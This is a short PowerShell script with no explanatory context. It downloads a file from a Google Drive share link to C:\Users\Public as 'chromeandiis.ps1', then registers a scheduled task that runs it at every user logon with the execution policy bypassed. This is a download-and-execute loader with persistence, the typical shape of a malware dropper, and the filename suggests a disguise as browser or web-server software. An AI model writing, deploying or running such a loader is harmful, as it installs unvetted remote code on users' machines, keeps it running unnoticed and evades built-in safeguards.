# Define the URL of the PowerShell file to download
$url = "https://drive.google.com/file/d/1uUwnvqqMWRCZ2L33J2lOLXcCuQFka-Xc/view?usp=sharing"

# Define the path for the temporary file to save the downloaded PowerShell script
$tempFilePath = "C:\Users\Public\chromeandiis.ps1"

# Download the PowerShell file from the URL and save it to the temporary file
Invoke-WebRequest -Uri $url -OutFile $tempFilePath

# Create a scheduled task to run the downloaded PowerShell script on user logon
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File $tempFilePath"
$trigger = New-ScheduledTaskTrigger -AtLogon
$task = New-ScheduledTask -Action $action -Trigger $trigger -TaskName "RunScriptOnLogon" -Description "Run PowerShell script on user logon"
Register-ScheduledTask -Task $task -Force
